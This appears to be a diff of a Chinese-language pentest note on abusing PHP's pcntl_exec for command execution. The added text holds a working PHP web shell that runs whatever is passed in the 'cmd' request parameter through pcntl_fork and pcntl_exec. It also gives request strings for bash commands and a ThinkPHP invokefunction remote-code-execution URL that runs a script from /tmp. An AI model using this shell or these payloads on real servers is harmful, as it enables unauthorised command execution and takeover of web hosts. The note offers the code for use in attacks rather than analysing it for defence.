@@ -4,6 +4,45 @@ slug: pcntl_exec
 Tag: Pentest
 
 
+2019.8.1更新
+
+这样子执行完就不会多出来<defunc>的进程，也不会多出来`php-fpm`进程:
+
+```
+<?php
+
+/**
+ * 子进程通过信号kill自己,也可以在父进程中发送kil信号结束子进程
+ */
+
+//生成子进程
+$cmd = $_REQUEST['cmd'];
+$pid = pcntl_fork();
+if($pid == -1){
+    die('could not fork');
+}else{
+    if($pid){
+        $status = 0;
+        pcntl_exec($cmd[0], $cmd[1]);
+        posix_kill(getmypid(),9);
+//阻塞父进程，直到子进程结束，不适合需要长时间运行的脚本.
+        //可使用pcntl_wait($status, WNOHANG)实现非阻塞式
+
+        pcntl_wait($status);
+        exit;
+    }
+}
+```
+
+`cmd[0]=/bin/bash&cmd[1][0]=-c&cmd[1][1]=ping%20baidu.com%20%26%26%20pkill%20php-fpm`
+
+**执行命令的时候不要阻塞，不要阻塞,不要阻塞(举个例子，ping baidu.com就很蠢了)**
+
+
+
+-----------------------------
+
+
 ```
 参数执行:
 pcntl_exec("/bin/bash",array("-c","id > 1.txt")) //返回值可能是502
@@ -30,6 +69,7 @@ if(function_exists('pcntl_exec')) {
 
 
 cmd[0]=/bin/bash&cmd[1][0]=-c&cmd[1][1]=id > /tmp/xxx.txt
+
 /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=pcntl_exec&vars[1][0]=/bin/bash&vars[1][1][0]=/tmp/1.sh
 
 ```
